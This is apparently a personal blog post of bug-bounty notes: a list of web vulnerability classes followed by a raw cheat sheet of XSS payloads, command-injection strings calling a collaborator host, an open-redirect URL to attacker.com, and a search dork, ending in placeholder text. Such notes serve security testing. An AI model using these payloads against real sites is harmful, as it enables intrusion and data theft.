---
title: "Web App Security"
date: "2019-12-19"
layout: posts

---

Cross-site scripting (XSS)
SQL injection
Cross-site request forgery
XML external entity injection
Directory traversal
Server-side request forgery


XSS
    <u>test</u>
    <b>lgmstest</b>
    <script>alert(1)</script>
    </script/x>alert(1)</script/x>
    <svg/onload=alert(\"1\")
    <a src=www.google.com>test</a>
    <h1>t</h1>
    <H1>T
    >'>"><img src=x onerror=alert(0)>
    “><img src=x onerror=prompt(document.domain)>

    <script alert(9)</script>.jpeg
    <script>alert(1)</script>
    </script/x>alert(1)</script/x>
    <svg/onload=alert(\"1\")
    xss?name=Bob<script src='https://demoapp.loc/js/script?v=1.7.3.css%2522/>%2527)%3Balert(%2522Yeah!%2520Chaining!%2522)%3B//'></script>
    ?<script src="https://raw.githubusercontent.com/nettitude/xss_payloads/master/recon.php"></script>



Injection
|%7cnslookup%20(collabip)%20%23
%7cping%20-c%2015%20127.0.0.1%20%23

redirect
https://example.com/signup?redirectUrl=https://attacker.com/
inurl:redirectUrl=http site:target.com

test dulu
![source-code](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/finn.jpg){: .align-center}

---

**Solution**


    kk
    ss


`test`


